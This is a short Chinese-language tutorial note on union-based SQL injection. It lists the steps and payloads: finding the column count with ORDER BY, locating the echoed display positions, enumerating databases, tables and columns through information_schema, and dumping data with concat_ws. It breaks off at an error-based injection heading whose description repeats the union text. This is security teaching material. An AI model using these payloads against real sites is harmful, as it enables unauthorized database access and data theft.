# 注入法详解
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x01 回显注入法(能在页面直接显示结果)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UNION联合查询: 通过 union 操作符，合并两个或者多个select语句的结果集
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;union内部的select语句必须拥有**相同数量的列**，列的数据类型必须相似，列的顺序也必须相同
![](/assets/WX20190221-152225@2x.png)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;union注入法前提要**知道列数**和**页面能回显**，一般注入步骤如下:
```sql
确定列数: order by NUM，NUM采用二分方法加快查询速度，NUM回显报错就说明超过列数
显示位置: 参数 union select num1，num2，..,NUM，参数要强制报错，才能显示返回数据的位置
查询库: union select num1,group_concat(schema_name) from information_schema.schemata
查询表: union select num1,group_concat(table_name) from information_schema.tables where table_schema=database()
查询列: union select num1,group_concat(column_name) from information_schema.columns where table_name='表名'(注1)
查数据: union select num1,concat_ws(0x7e,列名,列名) from 库名.表名

注意点: 1.表名要么加上引号，要么建议使用十六进制
```
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;报错查询: 通过 union 操作符，合并两个或者多个select语句的结果集


